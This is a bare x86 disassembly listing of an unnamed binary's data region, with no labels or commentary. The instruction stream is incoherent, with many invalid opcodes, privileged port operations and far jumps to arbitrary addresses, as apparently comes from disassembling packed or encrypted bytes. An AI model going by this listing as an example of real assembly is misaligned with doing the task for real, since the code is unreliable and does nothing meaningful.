  41614c:	xor    BYTE PTR [edx+edi*8],al
  41614f:	mov    al,ds:0x88f94e0d
  416154:	pop    esp
  416155:	mov    dh,0x19
  416157:	sbb    al,0x3a
  416159:	push   0x3f475986
  41615e:	mov    al,0x83
  416160:	and    DWORD PTR [edi-0x7a],edx
  416163:	call   0x8d52:0x6d5c7210
  41616a:	mov    gs,esi
  41616c:	inc    esp
  41616d:	inc    ebx
  41616e:	adc    BYTE PTR [ebx+0x23],cl
  416171:	popf   
  416172:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416173:	inc    edi
  416174:	cwde   
  416175:	fnstsw WORD PTR [edx-0x9]
  416178:	or     eax,0x6efda755
  41617d:	push   edi
  41617e:	lds    edx,FWORD PTR [ebp+0x5d7805a7]
  416184:	add    al,0xe
  416186:	shl    bh,cl
  416188:	rcl    edi,cl
  41618a:	adc    eax,0xbfe5f865
  41618f:	repnz xor BYTE PTR [edi+0x29f4852d],al
  416196:	fild   QWORD PTR [esi+edi*2-0x2d2ffd8f]
  41619d:	imul   ecx,DWORD PTR [eax-0x100150],0x17
  4161a4:	ds xchg edi,eax
  4161a6:	jb     0x4161a4
  4161a8:	int3   
  4161a9:	jb     0x41613b
  4161ab:	add    DWORD PTR [ebx],eax
  4161ad:	and    DWORD PTR [edi],esp
  4161af:	shr    DWORD PTR [edx-0x78],cl
  4161b2:	js     0x416176
  4161b4:	lods   al,BYTE PTR ds:[esi]
  4161b5:	or     eax,0xfb1b7c39
  4161ba:	out    dx,al
  4161bb:	push   ebx
  4161bc:	loop   0x4161c5
  4161be:	mov    esp,0xaabc5feb
  4161c3:	inc    eax
  4161c4:	inc    ebx
  4161c6:	push   edx
  4161c7:	or     DWORD PTR [ebx+0x4b],0xbb4a68b0
  4161ce:	cwde   
  4161cf:	xor    BYTE PTR [ebp+0x61],al
  4161d2:	adc    edx,DWORD PTR [esi+0xd51312f]
  4161d8:	call   0xfdb0368c
  4161dd:	mov    esi,0xcac3b21c
  4161e2:	or     eax,0xd1ec0a37
  4161e7:	pop    esi
  4161e8:	push   ss
  4161e9:	push   ebp
  4161ea:	cld    
  4161eb:	mov    ebp,0x5c78a18e
  4161f0:	dec    edi
  4161f1:	in     al,dx
  4161f2:	inc    ecx
  4161f3:	jle    0x4161b7
  4161f5:	std    
  4161f6:	inc    ebp
  4161f7:	sbb    BYTE PTR [bp+di],cl
  4161fa:	push   edi
  4161fb:	js     0x416203
  4161fd:	inc    esi
  4161fe:	push   0xfffffff5
  416200:	inc    esp
  416201:	jns    0x41618b
  416203:	or     BYTE PTR [ecx+0x4],0xe6
  416207:	es retf 
  416209:	push   esp
  41620a:	pushf  
  41620b:	cmp    eax,0x5fb2af85
  416210:	es jbe 0x41622a
  416213:	mov    ds:0x5a9486e0,al
  416218:	cli    
  416219:	push   ecx
  41621a:	xchg   edi,eax
  41621b:	imul   ecx,esp,0x461255d8
  416221:	cmp    ah,0x9
  416224:	loop   0x416203
  416226:	jp     0x4161b4
  416228:	retf   0x3979
  41622b:	mov    dh,0xf2
  41622d:	aad    0x24
  41622f:	fisub  DWORD PTR [ecx-0x40]
  416232:	or     DWORD PTR [edi-0x4b62bade],esi
  416238:	out    dx,eax
  416239:	sub    al,0x3c
  41623b:	mov    al,ds:0x2a93cc63
  416240:	loop   0x41620c
  416242:	mov    WORD PTR [ecx-0x72],cs
  416245:	push   ss
  416246:	xor    DWORD PTR [edi-0x41],ecx
  416249:	mov    bh,0x39
  41624b:	mov    ds:0x2723a1f5,al
  416251:	ja     0x416218
  416253:	mov    edi,?
  416255:	fs ins DWORD PTR es:[edi],dx
  416257:	and    ecx,edi
  416259:	adc    eax,0x774e7faf
  41625e:	mov    DWORD PTR [edx-0xb9398fe],esi
  416264:	mov    edx,0xc53de943
  41626a:	les    edx,FWORD PTR [esi+eiz*8]
  41626d:	aad    0x87
  41626f:	jno    0x416210
  416271:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416272:	stos   DWORD PTR es:[edi],eax
  416273:	lds    esi,FWORD PTR [eax+0x7967f2c0]
  416279:	call   0x6238:0x55f2d1de
  416280:	jle    0x4162c2
  416282:	pop    ss
  416283:	dec    edx
  416284:	pop    es
  416285:	push   es
  416286:	mov    WORD PTR [eax+0x3b09db47],es
  41628c:	jecxz  0x416277
  41628e:	hlt    
  41628f:	sub    edx,DWORD PTR [esp+esi*2+0xb]
  416293:	repz (bad) 
  416295:	stc    
  416296:	sbb    esi,ebx
  416298:	repz dec edi
  41629a:	xchg   esp,eax
  41629b:	inc    ecx
  41629c:	jmp    0x1caeb319
  4162a1:	mov    ss,WORD PTR [ebp+0x61]
  4162a4:	test   eax,0x6871cb23
  4162a9:	loopne 0x4162fb
  4162ab:	sbb    eax,0xdb93a0d3
  4162b0:	xchg   BYTE PTR [edx-0x70e37d2],ah
  4162b6:	js     0x416244
  4162b8:	and    esp,esp
  4162ba:	cs aaa 
  4162bc:	mov    esi,0x741f674e
  4162c1:	push   ss
  4162c2:	popf   
  4162c3:	das    
  4162c4:	jecxz  0x4162ef
  4162c6:	cdq    
  4162c7:	bound  eax,QWORD PTR [ebp+ecx*1-0x55]
  4162cb:	add    DWORD PTR [ebx-0x9],esp
  4162ce:	jmp    0x5f54f9ef
  4162d3:	mov    ch,0x33
  4162d5:	xchg   ebx,eax
  4162d6:	imul   esp,DWORD PTR [ecx+0x5],0xdb7ea6bc
  4162dd:	(bad)  [edi-0x5035d863]
  4162e3:	repz push esp
  4162e5:	nop
  4162e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4162e7:	cli    
  4162e8:	repnz add BYTE PTR [ebx],0x29
  4162ec:	jnp    0x41630a
  4162ee:	adc    al,0xbf
  4162f0:	loopne 0x4162f6
  4162f2:	cmp    BYTE PTR [ecx],bl
  4162f4:	out    0x8a,al
  4162f6:	ss mov DWORD PTR ss:[ecx-0x2a2b10d9],ecx
  4162fe:	out    0x13,eax
  416300:	xchg   ebp,eax
  416301:	pop    ebp
  416302:	into   
  416303:	shr    DWORD PTR [edx],0x7a
  416306:	push   ss
  416307:	mov    ch,BYTE PTR [esi]
  416309:	shr    cl,1
  41630b:	sahf   
  41630c:	(bad)  
  41630d:	aad    0x3a
  41630f:	je     0x41630e
  416311:	lea    eax,[ebp+0x6c26d93a]
  416317:	xor    DWORD PTR [esi+0x5f],esi
  41631a:	ret    
  41631b:	or     BYTE PTR [ecx+0x733c17a5],ah
  416321:	adc    dl,cl
  416323:	push   0xf61e584a
  416328:	fsub   QWORD PTR fs:0x2c6cda28
  41632f:	mov    eax,esp
  416331:	test   ch,cl
  416333:	sbb    BYTE PTR [esp+ecx*8],0xf5
  416337:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416338:	mov    DWORD PTR [edi-0x46],ebx
  41633b:	out    0x81,eax
  41633d:	pop    eax
  41633e:	stc    
  41633f:	aad    0x3c
  416341:	mov    ds:0xf0c3ab59,al
  416346:	mov    DWORD PTR [ecx-0x2d87e2ff],edx
  41634c:	xchg   BYTE PTR [ecx-0x2f],ah
  41634f:	ficom  DWORD PTR [ecx+0x13]
  416352:	push   ebx
  416353:	add    BYTE PTR ds:0x8a3300e1,0xa3
  41635a:	les    esp,FWORD PTR [edi+ebx*8]
  41635d:	and    al,0x47
  41635f:	sub    BYTE PTR [esi],bl
  416361:	movd   mm0,DWORD PTR [eax-0x53]
  416365:	push   es
  416366:	and    BYTE PTR [ebp-0x3c],ah
  416369:	sub    edi,DWORD PTR [eax-0x46219476]
  41636f:	jge    0x41637a
  416371:	(bad)  
  416372:	xchg   esp,eax
  416373:	test   eax,0x72ca41a2
  416378:	jl     0x4163a3
  41637a:	retf   
  41637b:	bound  eax,QWORD PTR [eax+0x79262072]
  416381:	jg     0x4163fb
  416383:	jp     0x416356
  416385:	ins    BYTE PTR es:[edi],dx
  416386:	jmp    0x416375
  416388:	out    dx,al
  416389:	aad    0x3e
  41638b:	lock dec ebx
  41638d:	nop
  41638e:	loop   0x4163ff
  416390:	and    al,0x2d
  416392:	cmp    edx,DWORD PTR [ebx]
  416394:	frstor [ecx]
  416396:	inc    ecx
  416397:	jnp    0x41634f
  416399:	daa    
  41639a:	(bad)  
  41639b:	ds stc 
  41639d:	stc    
  41639e:	xor    DWORD PTR [ecx],eax
  4163a0:	sbb    BYTE PTR [edx],ah
  4163a2:	in     eax,dx
  4163a3:	cld    
  4163a4:	aas    
  4163a5:	cmp    ch,bl
  4163a7:	loop   0x41633d
  4163a9:	push   es
  4163aa:	mov    esi,0xc400560a
  4163af:	push   esp
  4163b0:	mov    esp,0x2c6054ea
  4163b5:	pop    esi
  4163b6:	xchg   BYTE PTR ds:0x435d9ee2,bh
  4163bc:	and    BYTE PTR [edx+esi*4],0x2d
  4163c0:	in     al,dx
  4163c1:	outs   dx,DWORD PTR ds:[esi]
  4163c2:	jl     0x41637d
  4163c4:	sub    dh,BYTE PTR [edi]
  4163c6:	(bad)  
  4163c8:	mov    esp,0xb2ecb7c5
  4163cd:	mov    ds:0xf3599b6a,al
  4163d2:	ins    BYTE PTR es:[edi],dx
  4163d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163d4:	ret    0xaa
  4163d7:	push   edx
  4163d8:	sub    ah,BYTE PTR [edx+edx*4]
  4163db:	sbb    eax,0xf5b2ef28
  4163e0:	fadd   QWORD PTR ds:0xe2c9138a
  4163e6:	jle    0x41644b
  4163e8:	lock dec edx
  4163ea:	pop    edi
  4163eb:	repnz gs lock cld 
  4163ef:	xchg   esp,eax
  4163f0:	imul   ebp,DWORD PTR [eax-0x2ad892f],0xcde00b77
  4163fa:	jmp    0xfeb9:0xd0ee5d4d
  416401:	stc    
  416402:	and    DWORD PTR ss:[edx+ebp*8],edi
  416406:	xchg   ebx,eax
  416407:	mov    ah,0x2b
  416409:	test   eax,0xe8af59af
  41640e:	cs aad 0xe1
  416411:	(bad)
  416414:	loop   0x4163e5
  416416:	xor    bl,BYTE PTR [eax+0x79]
  416419:	pop    edx
  41641a:	fistp  WORD PTR [ecx]
  41641c:	add    dh,BYTE PTR [ebx+0x25ce3a1d]
  416422:	(bad)  
  416423:	(bad)  
  416424:	pop    eax
  416425:	sub    ebp,DWORD PTR [edx-0x3f]
  416428:	(bad)  
  416429:	jp     0x4163ce
  41642b:	xchg   esi,eax
  41642c:	pop    ds
  41642d:	push   eax
  41642e:	fdiv   st,st(7)
  416430:	add    eax,0x85d95b23
  416435:	adc    BYTE PTR [ebx],dl
  416437:	addr16 adc al,0x71
  41643a:	int3   
  41643b:	cdq    
  41643c:	data16 jl 0x416419
  41643f:	mov    ebx,0xedc3d0c3
  416444:	and    BYTE PTR [ecx+0x7547eb93],dl
  41644a:	and    BYTE PTR [edx-0x6],ah
  41644d:	push   eax
  41644e:	xor    ch,dh
  416450:	dec    ebp
  416451:	mov    DWORD PTR [edx],ecx
  416453:	inc    edi
  416454:	or     dl,BYTE PTR [eax]
  416456:	bound  ecx,QWORD PTR [edi]
  416458:	xchg   edx,eax
  416459:	clc    
  41645a:	lahf   
  41645b:	arpl   sp,ax
  41645d:	jge    0x416454
  41645f:	push   ss
  416460:	in     al,0xd3
  416462:	shl    BYTE PTR [esi],cl
  416464:	stc    
  416465:	sahf   
  416466:	repnz dec ebx
  416468:	shr    BYTE PTR [ebp-0xd9e2aae],0x95
  41646f:	add    dl,BYTE PTR [ebx]
  416471:	or     esi,DWORD PTR [ecx]
  416473:	scas   eax,DWORD PTR es:[edi]
  416474:	mov    ds,WORD PTR ds:0x61d2856d
  41647a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41647b:	rcr    BYTE PTR ds:0xa6cdebef,cl
  416481:	daa    
  416482:	push   ds
  416483:	int    0xff
  416485:	and    BYTE PTR [esi+0x47],dl
  416488:	push   ebx
  416489:	fdivr  QWORD PTR [ebx+ecx*8]
  41648c:	cmp    eax,0x64b0233c
  416491:	adc    BYTE PTR [eax],cl
  416493:	pushf  
  416494:	push   ss
  416495:	push   0x69f06145
  41649a:	lock pop ecx
  41649c:	add    DWORD PTR [esi],ebx
  41649e:	mov    bh,0x76
  4164a0:	or     BYTE PTR [eax+0x10],0x59
  4164a4:	sub    cl,al
  4164a6:	lea    edx,[esi+ebx*4]
  4164a9:	mov    ds:0x501f36b8,al
  4164ae:	scas   eax,DWORD PTR es:[edi]
  4164af:	dec    ebp
  4164b0:	mov    bl,0x30
  4164b2:	pop    esi
  4164b3:	push   ecx
  4164b4:	mov    cl,0x8a
  4164b6:	dec    esi
  4164b7:	sbb    edi,eax
  4164b9:	or     al,0xc3
  4164bb:	push   ds
  4164bc:	add    esp,DWORD PTR [edx]
  4164be:	data16 fistp DWORD PTR [ebp+0x49301004]
  4164c5:	repnz sub eax,0xf4811d8f
  4164cb:	mov    ebx,0xb38121fd
  4164d0:	lea    edi,[edi+0x71]
  4164d3:	add    ch,ah
  4164d5:	stc    
  4164d6:	pop    ss
  4164d7:	cld    
  4164d8:	sub    DWORD PTR [ebx-0xc],esi
  4164db:	repz fldenv [eax]
  4164de:	je     0x416511
  4164e0:	iret   
  4164e1:	gs nop
  4164e3:	imul   esp,DWORD PTR [ebx-0x9c832bc],0x3da4507b
  4164ed:	ja     0x416531
  4164ef:	bound  eax,QWORD PTR [ebp-0x3]
  4164f2:	mov    es,WORD PTR [esi-0x68]
  4164f5:	lods   al,BYTE PTR ds:[esi]
  4164f6:	pop    esp
  4164f7:	popa   
  4164f8:	push   edi
  4164f9:	push   DWORD PTR [ecx-0x5e]
  4164fc:	mov    al,0x9c
  4164fe:	inc    ebp
  4164ff:	(bad)  
  416500:	fstp   st(0)
  416502:	or     bl,dh
  416504:	ret    
  416505:	dec    esp
  416506:	les    esp,FWORD PTR [edi]
  416508:	shl    DWORD PTR [ecx-0x79719c0f],1
  41650e:	mov    eax,ds:0x1f3c2af5
  416513:	lock pop eax
  416515:	push   es
  416516:	adc    al,0xaf
  416518:	sbb    bh,BYTE PTR [esi]
  41651a:	mov    al,0xe9
  41651c:	popa   
  41651d:	xchg   ecx,eax
  41651e:	cdq    
  41651f:	mov    dl,0x20
  416521:	test   al,0x28
  416523:	sbb    al,0xd7
  416525:	xlat   BYTE PTR ds:[ebx]
  416526:	jns    0x4164d2
  416528:	fsub   QWORD PTR ds:0x70ccee17
  41652e:	mov    edx,0x7ba121f1
  416533:	nop
  416534:	(bad)  
  416535:	int    0x9a
  416537:	test   DWORD PTR [edi-0x4e],ebx
  41653a:	lock jbe 0x41651e
  41653d:	adc    cl,BYTE PTR [edx]
  41653f:	mov    cl,bl
  416541:	pop    es
  416542:	mov    ds:0x6200d372,eax
  416547:	jge    0x416516
  416549:	jo     0x41659d
  41654b:	sub    eax,0x6903f15d
  416550:	mov    al,ds:0x7f5df86a
  416555:	push   ebp
  416556:	cld    
  416557:	shl    BYTE PTR [ecx],0x8e
  41655a:	cdq    
  41655b:	in     eax,dx
  41655c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41655d:	mov    cl,0x2b
  41655f:	inc    ebp
  416560:	dec    esp
  416561:	in     eax,dx
  416562:	push   ebp
  416563:	cmc    
  416564:	or     DWORD PTR [eax-0x58],0x38
  416568:	sbb    eax,0xf83331ac
  41656d:	popf   
  41656e:	arpl   WORD PTR [ecx],sp
  416570:	mov    esp,DWORD PTR [edx-0x79]
  416573:	cmc    
  416574:	push   cs
  416575:	mov    al,0xb6
  416577:	xchg   edi,eax
  416578:	pop    ebx
  416579:	adc    eax,0x2da26a35
  41657e:	jnp    0x4165bb
  416580:	cmp    BYTE PTR [ebx],ch
  416582:	dec    edi
  416583:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416584:	jl     0x416572
  416586:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416587:	dec    esp
  416588:	add    ah,BYTE PTR [ecx-0x7d]
  41658b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41658c:	scas   eax,DWORD PTR es:[di]
  41658e:	(bad)  [ebp+0x65]
  416591:	arpl   WORD PTR [ecx-0x4dca9969],di
  416597:	(bad)  
  416598:	mov    edx,0xc662b058
  41659d:	xor    eax,DWORD PTR [eax+0x1c373d6c]
  4165a3:	pop    esi
  4165a4:	popa   
  4165a5:	or     eax,DWORD PTR [edx]
  4165a7:	jmp    0x82ece867
  4165ac:	sbb    BYTE PTR [edi+0x4c],ch
  4165af:	cmp    cl,BYTE PTR [esi-0xc]
  4165b2:	outs   dx,BYTE PTR ds:[esi]
  4165b3:	js     0x4165e4
  4165b5:	xor    BYTE PTR [ecx+0x6c],ah
  4165b8:	(bad)  
  4165b9:	jmp    0x41654b
  4165bb:	xlat   BYTE PTR ds:[ebx]
  4165bc:	lock iret 
  4165be:	lea    edi,[edx-0x3e]
  4165c1:	mov    es,ecx
  4165c3:	add    ah,ch
  4165c5:	cmp    esi,DWORD PTR [edx+0x2f]
  4165c8:	push   ds
  4165c9:	xor    edi,esp
  4165cb:	inc    esi
  4165cc:	lahf   
  4165cd:	int3   
  4165ce:	out    dx,eax
  4165cf:	dec    edi
  4165d0:	inc    esi
  4165d1:	aam    0x2f
  4165d3:	loopne 0x41655c
  4165d5:	enter  0xcd1c,0xf8
  4165d9:	dec    ebx
  4165da:	mov    ebp,0x5e6b3618
  4165df:	sbb    eax,0x5ed1052
  4165e4:	xchg   edx,eax
  4165e5:	rol    DWORD PTR [eax],1
  4165e7:	call   0xa71068c
  4165ec:	or     cl,BYTE PTR [ecx+esi*1]
  4165ef:	mov    ?,WORD PTR [edx]
  4165f1:	jae    0x4165c4
  4165f3:	push   ss
  4165f4:	dec    ebp
  4165f5:	test   BYTE PTR [eax-0x7c502aed],0xfc
  4165fc:	dec    ebp
  4165fd:	mov    edi,0x22cebd79
  416602:	or     al,0xc1
  416604:	rcr    BYTE PTR [ebx],1
  416606:	cdq    
  416607:	leave  
  416608:	mov    esi,0x76891161
  41660d:	adc    dh,BYTE PTR [eax-0x56284db7]
  416613:	adc    DWORD PTR [edx+0x9],esi
  416616:	push   edx
  416617:	nop
  416618:	aad    0xc2
  41661a:	xchg   ecx,eax
  41661b:	cmp    ch,cl
  41661d:	mov    ebx,0xa89f354c
  416622:	pop    edx
  416623:	push   esp
  416624:	mov    eax,ds:0x63646b70
  416629:	shl    DWORD PTR [ebx-0x41],1
  41662c:	enter  0x25b4,0x66
  416630:	mov    bl,BYTE PTR ss:[esi-0x28]
  416634:	xchg   ecx,eax
  416635:	pop    ecx
  416636:	xchg   BYTE PTR [ebx],bh
  416638:	mov    edx,0x38774ac
  41663d:	pop    ecx
  41663e:	ds ret 0x5c61
  416642:	ja     0x41662f
  416644:	pop    ds
  416645:	dec    DWORD PTR [eax+eax*4+0x2e109caa]
  41664c:	into   
  41664d:	or     al,0x56
  41664f:	and    dh,BYTE PTR [esi]
  416651:	icebp  
  416652:	add    DWORD PTR [ebx],ebx
  416654:	aaa    
  416655:	nop
  416656:	jns    0x416651
  416658:	or     eax,0x912afedf
  41665d:	push   0x18
  41665f:	jns    0x416607
  416661:	mov    eax,ds:0x40ef8716
  416666:	gs js  0x41662c
  416669:	fwait
  41666a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41666b:	jmp    0x41664a
  41666d:	and    al,0x62
  41666f:	xchg   BYTE PTR [ecx+ecx*8-0x4e],dh
  416673:	push   ds
  416674:	dec    DWORD PTR [ebx+0x29]
  416677:	sub    eax,0xa59ab312
  41667c:	mov    al,ch
  41667e:	lock adc bh,BYTE PTR [ebp+0x1f]
  416682:	ret    0x8ce6
  416685:	fcomp  DWORD PTR [eax+0x1c]
  416688:	pop    ebp
  416689:	xchg   ebp,eax
  41668a:	pop    ebx
  41668b:	cli    
  41668c:	xchg   ecx,ebx
  41668e:	fstp   DWORD PTR [eax+0x257e06ba]
  416694:	sub    edx,ebx
  416696:	and    edx,DWORD PTR [ecx]
  416698:	adc    ah,BYTE PTR [ecx-0x6afaddb6]
  41669e:	cmp    eax,0xf2faca66
  4166a3:	stos   DWORD PTR es:[edi],eax
  4166a4:	lods   eax,DWORD PTR ds:[esi]
  4166a5:	mov    edx,0x5a1d4970
  4166aa:	das    
  4166ab:	sbb    al,0xf6
  4166ad:	repnz les eax,FWORD PTR [eax+0x59]
  4166b1:	in     al,dx
  4166b2:	ret    0x4612
  4166b5:	aam    0xa5
  4166b7:	mov    ecx,0x80cbd6de
  4166bc:	jmp    0xc081:0x4750e301
  4166c3:	retf   
  4166c4:	push   edx
  4166c5:	in     al,0xe5
  4166c7:	loop   0x4166f2
  4166c9:	xor    DWORD PTR [ecx],esp
  4166cb:	cli    
  4166cc:	es hlt 
  4166ce:	dec    esp
  4166cf:	lahf   
  4166d0:	xor    dl,dl
  4166d2:	das    
  4166d3:	test   al,0x3
  4166d5:	sbb    DWORD PTR [esi],esp
  4166d7:	push   ds
  4166d8:	adc    eax,0x4b9a5d7b
  4166dd:	push   0xe3c1f8c8
  4166e2:	in     eax,dx
  4166e3:	sbb    al,0xb3
  4166e5:	pop    eax
  4166e6:	stc    
  4166e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166e8:	stos   BYTE PTR es:[edi],al
  4166e9:	sbb    DWORD PTR [edx+0x1f13ec5c],0x7c0f224f
  4166f3:	xchg   edx,eax
  4166f4:	out    dx,eax
  4166f5:	enter  0x531c,0xfd
  4166f9:	pop    esi
  4166fa:	jecxz  0x4166e9
  4166fc:	jbe    0x4166dd
  4166fe:	jp     0x416688
  416700:	sbb    BYTE PTR [ecx-0x3d],cl
  416703:	push   esp
  416704:	pusha  
  416705:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416707:	mov    ch,0x67
  416709:	out    dx,eax
  41670a:	xchg   esi,eax
  41670b:	in     al,dx
  41670c:	outs   dx,DWORD PTR ds:[esi]
  41670d:	adc    DWORD PTR [esi-0xa],ebp
  416710:	into   
  416711:	adc    cl,BYTE PTR [edi+eiz*2+0x2dab53ee]
  416718:	pusha  
  416719:	shr    bh,cl
  41671b:	cmp    BYTE PTR [ecx-0x76],dl
  41671e:	pop    DWORD PTR [eax+0x2ef02002]
  416724:	xchg   ebp,eax
  416725:	pop    ss
  416726:	adc    edx,DWORD PTR [ecx]
  416728:	pop    eax
  416729:	stos   BYTE PTR es:[edi],al
  41672a:	xchg   esp,eax
  41672b:	test   al,0x72
  41672d:	push   ebx
  41672e:	jnp    0x4166f3
  416730:	adc    esi,edx
  416732:	cmp    ecx,DWORD PTR [edi-0x3432ab7]
  416738:	stos   DWORD PTR es:[edi],eax
  416739:	enter  0xbac7,0x45
  41673d:	sub    ch,BYTE PTR [ebx+eax*8+0x66]
  416741:	push   eax
  416742:	ds sub eax,0x66ea1523
  416748:	mov    ebx,0xfa2559e1
  41674d:	xchg   esp,eax
  41674e:	rol    al,1
  416750:	adc    al,0x81
  416752:	adc    al,0xf7
  416754:	imul   esp,DWORD PTR ds:0xca9d49de,0xffffffc0
  41675b:	adc    ebx,edx
  41675d:	mov    esi,0x9b53d4dd
  416762:	mov    ecx,0x8d1f9c60
  416767:	mov    eax,ds:0xad38a97
  41676c:	and    bh,BYTE PTR [edi-0x29e74f2e]
  416772:	push   edx
  416773:	xchg   ecx,eax
  416774:	add    al,0x26
  416776:	jmp    0x4167ae
  416778:	push   ss
  416779:	mov    eax,es
  41677b:	ins    BYTE PTR es:[edi],dx
  41677c:	lock aaa 
  41677e:	in     eax,dx
  41677f:	shl    BYTE PTR [esi+edx*1+0x4b],cl
  416783:	xchg   esi,eax
  416784:	fcmovne st,st(6)
  416786:	sub    al,0x1a
  416788:	rol    DWORD PTR [ebx+0x2a],1
  41678b:	adc    edi,DWORD PTR [edx-0x7e]
  41678e:	and    ch,dl
  416790:	xchg   esp,eax
  416791:	adc    BYTE PTR [edx+0x25308581],0x53
  416798:	xor    BYTE PTR [esi],cl
  41679a:	adc    al,0x97
  41679c:	into   
  41679d:	mov    ebp,0x8d64b68a
  4167a2:	or     eax,DWORD PTR [edx]
  4167a4:	out    dx,al
  4167a5:	cmp    eax,DWORD PTR [esi+ebp*8]
  4167a8:	aad    0x55
  4167aa:	xchg   ebx,eax
  4167ab:	jle    0x4167de
  4167ad:	fisubr WORD PTR [ebx]
  4167af:	or     esp,DWORD PTR [eax]
  4167b1:	out    0x13,eax
  4167b3:	and    ah,BYTE PTR [ebx-0x7e590059]
  4167b9:	sti    
  4167ba:	in     al,0x8b
  4167bc:	pop    ss
  4167bd:	inc    edi
  4167be:	mov    ds,ebp
  4167c0:	out    dx,eax
  4167c1:	push   0x6691b5fe
  4167c6:	out    dx,al
  4167c7:	pop    esp
  4167c8:	into   
  4167c9:	shl    dh,cl
  4167cb:	jmp    0xf808e714
  4167d0:	sub    dh,cl
  4167d2:	xchg   esp,eax
  4167d3:	dec    edi
  4167d4:	neg    BYTE PTR [edi+0x18]
  4167d7:	inc    ebp
  4167d8:	daa    
  4167d9:	or     DWORD PTR [edx+0x126e3b2a],eax
  4167df:	add    ecx,DWORD PTR [ebp-0x52]
  4167e2:	push   ecx
  4167e3:	sbb    DWORD PTR [ebx-0x2b],eax
  4167e6:	popf   
  4167e7:	xchg   ebx,eax
  4167e8:	in     eax,0x14
  4167ea:	push   cs
  4167eb:	adc    ecx,ecx
  4167ed:	pop    ebp
  4167ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167ef:	or     al,bh
  4167f1:	xor    cl,dl
  4167f3:	xchg   esp,eax
  4167f4:	jb     0x4167dd
  4167f6:	push   esp
  4167f7:	mov    ds:0x37c9d6fa,eax
  4167fc:	push   ss
  4167fd:	or     eax,0xc8a09a71
  416802:	loope  0x416807
  416804:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416805:	aad    0xd5
  416807:	sub    BYTE PTR [ecx+0x74],0x5b
  41680b:	sub    DWORD PTR [ebp-0x5ffb4538],esp
  416811:	ret    
  416812:	sbb    dh,BYTE PTR [ecx+esi*4-0x7f]
  416816:	iret   
  416817:	add    BYTE PTR [ebx+0x4c],ah
  41681a:	call   0x19c8aa51
  41681f:	mov    ecx,0x91068ec9
  416824:	test   BYTE PTR [ebx],ah
  416826:	xlat   BYTE PTR ds:[ebx]
  416827:	ror    BYTE PTR [ecx],cl
  416829:	cwde   
  41682a:	hlt    
  41682b:	push   edi
  41682c:	mov    cl,0x16
  41682e:	(bad)  
  41682f:	xchg   edi,eax
  416830:	popf   
  416831:	sbb    BYTE PTR [edi-0x1ae651a8],bl
  416837:	jns    0x41688a
  416839:	jne    0x41680d
  41683b:	(bad)  
  41683c:	push   cs
  41683d:	and    eax,0x94bc6a45
  416842:	je     0x416830
  416844:	jle    0x416837
  416846:	pop    ss
  416847:	std    
  416848:	push   es
  416849:	imul   esp,edi,0xffffffcf
  41684c:	or     BYTE PTR [esi],ch
  41684e:	mov    ecx,0x42dd1fbe
  416853:	out    dx,al
  416854:	sub    ebx,DWORD PTR ds:0x8dfacf37
  41685a:	aaa    
  41685b:	inc    ecx
  41685c:	adc    al,0xe9
  41685e:	les    esi,FWORD PTR [ebx-0x5]
  416861:	rol    ebx,0xec
  416864:	xor    DWORD PTR [eax+edx*4],ebp
  416867:	sbb    DWORD PTR [esi+eax*4+0x57],edx
  41686b:	sub    dh,BYTE PTR [edi+0x225bdd4f]
  416871:	and    DWORD PTR [edi-0x6c],edi
  416874:	stos   DWORD PTR es:[edi],eax
  416875:	ffree  st(4)
  416877:	test   al,0x29
  416879:	cmc    
  41687a:	xchg   edi,eax
  41687b:	out    dx,al
  41687c:	fstp   st(3)
  41687e:	cwde   
  41687f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416880:	pop    ss
  416881:	stc    
  416882:	(bad)  
  416883:	stc    
  416884:	push   ebx
  416885:	aaa    
  416886:	fwait
  416887:	loopne 0x41689d
  416889:	pop    esi
  41688a:	cli    
  41688b:	inc    edi
  41688c:	out    0xfe,eax
  41688e:	mov    ds:0xfd7e1484,al
  416893:	sub    al,0xd
  416895:	sbb    edi,DWORD PTR [eax+ebp*1-0x63]
  416899:	test   eax,0xfa7882db
  41689e:	mov    ds:0xf412a4d2,al
  4168a3:	stc    
  4168a4:	mov    dl,0xff
  4168a6:	mov    gs,WORD PTR [eax]
  4168a8:	mov    cl,0xbf
  4168aa:	mov    bl,0xf6
  4168ac:	scas   al,BYTE PTR es:[edi]
  4168ad:	jne    0x41691b
  4168af:	mov    edx,0x951db3c8
  4168b4:	nop
  4168b5:	dec    edx
  4168b6:	js     0x416926
  4168b8:	inc    eax
  4168b9:	or     dh,BYTE PTR [ebx+ebx*2+0x53db213a]
  4168c0:	mov    dh,0x71
  4168c2:	pop    ds
  4168c3:	mov    al,0x6
  4168c5:	pusha  
  4168c6:	push   edi
  4168c7:	aam    0x38
  4168c9:	aas    
  4168ca:	into   
  4168cb:	test   DWORD PTR [ecx+0x30],esi
  4168ce:	sub    al,0x98
  4168d0:	das    
  4168d1:	pop    ecx
  4168d2:	lds    edi,FWORD PTR [eax+eiz*4+0xe07907c]
  4168d9:	fistp  WORD PTR [ebp+0x67]
  4168dc:	leave  
  4168dd:	retf   
  4168de:	ss mov ch,bl
  4168e1:	int    0xa5
  4168e3:	xchg   esp,eax
  4168e4:	outs   dx,DWORD PTR ds:[esi]
  4168e5:	adc    dl,ah
  4168e7:	sbb    BYTE PTR [esi],bl
  4168e9:	pop    ecx
  4168ea:	adc    BYTE PTR [ebp-0x36980e64],bh
  4168f0:	mov    dl,cl
  4168f2:	dec    edi
  4168f3:	xchg   ecx,eax
  4168f4:	jle    0x416969
  4168f6:	js     0x41696f
  4168f8:	jne    0x4168d0
  4168fa:	js     0x4168c7
